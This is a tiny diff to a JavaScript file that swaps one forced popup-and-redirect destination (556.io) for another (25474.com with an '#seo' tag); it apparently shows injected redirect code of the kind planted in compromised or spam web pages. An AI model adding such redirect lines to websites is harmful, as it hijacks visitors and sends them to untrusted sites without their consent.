@@ -1,2 +1,3 @@
- window.open ("http://556.io/#w"); 
- window.location.href="http://556.io/#w"; 
+ window.open("http://25474.com/#seo"); 
+ 
+ window.location.href="http://25474.com/#seo"; 
